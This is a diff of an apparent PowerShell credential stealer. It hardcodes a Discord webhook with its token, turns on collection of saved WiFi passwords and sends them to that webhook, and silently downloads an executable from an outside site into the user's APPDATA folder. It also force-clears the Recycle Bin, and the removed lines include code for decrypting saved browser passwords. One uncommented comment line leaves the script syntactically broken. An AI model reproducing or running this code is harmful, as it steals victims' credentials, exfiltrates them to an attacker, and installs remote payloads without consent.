@@ -1,42 +1,6 @@
 # Discord Webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1448171091561418896/qbtM5A8JrB-cV4HhDEM8itLK4zu2VlR5hWaFnPxwTwdXXMGf0nJkXLxNp0EiHfQl4P8m"
 
-function Decrypt() {
-    param (
-        [Parameter(Mandatory = $true)] [PsCustomObject] $params
-    )
-    $url      = $params.url
-    $username = $params.username
-    $keyB64   = $params.key
-    $passB64  = $params.password
-
-    $keyBytes = [Convert]::FromBase64String($keyB64)
-    $passBytes = [Convert]::FromBase64String($passB64)
-
-    $iv = $passBytes[3..14]                     # bytes 3-15 (12 bytes)
-    $ciphertext = $passBytes[15..($passBytes.Length - 17)]
-    $tag = $passBytes[($passBytes.Length - 16)..($passBytes.Length - 1)]
-
-    $plaintext = New-Object byte[] $ciphertext.Length
-
-    $aes = [System.Security.Cryptography.AesGcm]::new($keyBytes)
-
-    $aes.Decrypt(
-        $iv,
-        $ciphertext,
-        $tag,
-        $plaintext
-    )
-
-    $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($plaintext)
-
-    return @{Url = $url; User = $username; Password = $decryptedPassword;}
-}
-
-function Get-GoogleLoginCodes {
-    
-}
-
 function Get-WiFiPasswords {
 	$credentials = @()
 
@@ -86,12 +50,10 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 # Main execution - completely silent
 try {
-    # Get WiFi passwords
-    #$wifiPasswords = Get-WiFiPasswords
+    Get WiFi passwords
+    $wifiPasswords = Get-WiFiPasswords
     
-    #SendString-ToDiscord $wifiPasswords
-
-    Get-GoogleLoginCodes | Format-Table -AutoSize | Out-String
+    SendString-ToDiscord $wifiPasswords
 
     $url = "https://jaedan.org/ta.exe"
     $filePath = Join-Path -Path $env:APPDATA -ChildPath "temp\nka.exe"
